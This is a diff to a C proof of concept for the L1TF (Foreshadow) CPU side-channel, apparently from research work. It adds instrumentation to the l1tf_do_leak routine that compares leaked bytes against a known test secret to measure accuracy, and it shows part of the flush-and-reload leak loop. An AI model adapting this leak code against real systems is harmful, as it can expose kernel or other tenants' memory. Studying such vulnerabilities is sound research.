@@ -1,8 +1,8 @@
-#include <stdio.h>
 #define _GNU_SOURCE
+#include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
-#include "l1tf.h"
+#include "secret.h"
 #include "statistics.h"
 #include <asm-generic/errno-base.h>
 #include <bits/time.h>
@@ -10,9 +10,9 @@
 #include <err.h>
 #include <errno.h>
 #include <getopt.h>
-#include <signal.h>
 #include <stdbool.h>
 #include <stdint.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
@@ -317,9 +317,10 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
+  size_t *assembled_results = malloc(length * sizeof(size_t));
   const int bytes_per_line = 16;
 
-  for (int iter = 1; iter <= 10000; ++iter) {
+  for (int iter = 1; iter <= 1000; ++iter) {
     for (int x = 0; x < 10; ++x) {
       for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
         void *leak_addr = (char *)leak.leak + j;
@@ -345,9 +346,21 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
       }
 
       size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
+      assembled_results[i / 2] = result;
       printf("%02lx ", result);
 
       if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
+        // We would like to compare the results to the ground truth, to see the accuracy
+        printf("\t( ");
+        size_t line = i / (2 * bytes_per_line);
+        for (size_t byte = 0; byte < bytes_per_line; ++byte) {
+          size_t idx = byte + (line * bytes_per_line);
+          char secret_byte = SECRET_DATA[idx];
+          printf("%c%c ", ((assembled_results[idx] & 0xf0) == (secret_byte & 0xf0) ? '.' : 'X'),
+                 ((assembled_results[idx] & 0xf) == (secret_byte & 0xf) ? '.' : 'X'));
+        }
+        printf(")");
+
         printf("\n\r");
       }
     }
@@ -356,6 +369,7 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
     printf("\033[%ldA\r", length / bytes_per_line);
   }
 
+  free(assembled_results);
   free(results);
 
   l1tf_leak_buffer_free(&leak);
